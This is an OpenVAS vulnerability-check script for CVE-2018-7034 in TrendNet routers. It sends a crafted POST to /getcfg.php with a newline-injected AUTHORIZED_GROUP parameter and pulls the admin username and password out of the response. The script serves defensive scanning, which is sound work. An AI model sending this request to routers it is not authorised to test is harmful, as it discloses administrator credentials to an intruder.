###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trendnet_routers_info_disc.nasl 13722 2019-02-18 08:18:20Z mmartin $
#
# TrendNet Routers AUTHORIZED_GROUP Information Disclosure Vulnerability
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107299");
  script_version("$Revision: 13722 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-18 09:18:20 +0100 (Mon, 18 Feb 2019) $");
  script_tag(name:"creation_date", value:"2018-02-15 19:23:07 +0100 (Thu, 15 Feb 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2018-7034");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("TrendNet Routers AUTHORIZED_GROUP Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_trendnet_router_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("trendnet/detected");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2018/Feb/42");

  script_tag(name:"summary", value:"TrendNet routers are vulnerable to information disclosure attacks");

  script_tag(name:"impact", value:"An attacker can use this global variable to bypass security checks
  and use it to read arbitrary files.");

  script_tag(name:"insight", value:"The vulnerability is due to the global variable AUTHORIZED_GROUP
  which can be triggered when the admin login");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"vuldetect", value:"Send a crafted request to the router and check the response.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

cpe_list = make_list("cpe:/h:trendnet:tew-751dr", "cpe:/h:trendnet:tew-752dru", "cpe:/h:trendnet:tew-733gr");

if( ! infos = get_all_app_ports_from_list( cpe_list:cpe_list ) ) exit( 0 );
port = infos['port'];

url  ='/getcfg.php';
data = 'SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1';
req = http_post_req(port: port, url: url, data: data,
                    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

if (res =~ "HTTP/1\.. 200" && "<service>DEVICE.ACCOUNT</service>" >< res) {
  username = eregmatch(pattern: "<name>(.*)</name>", string: res);
  passwd = eregmatch(pattern: "<password>(.*)</password>", string: res);
  if (!isnull(username) && !isnull(passwd)) {
    report = "The following information could be disclosed:  user name is " + username[1] + " , password is " + passwd[1];
  } else  {
    report = "The following response contains disclosed information from the router \n";
    report += res;
  }
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
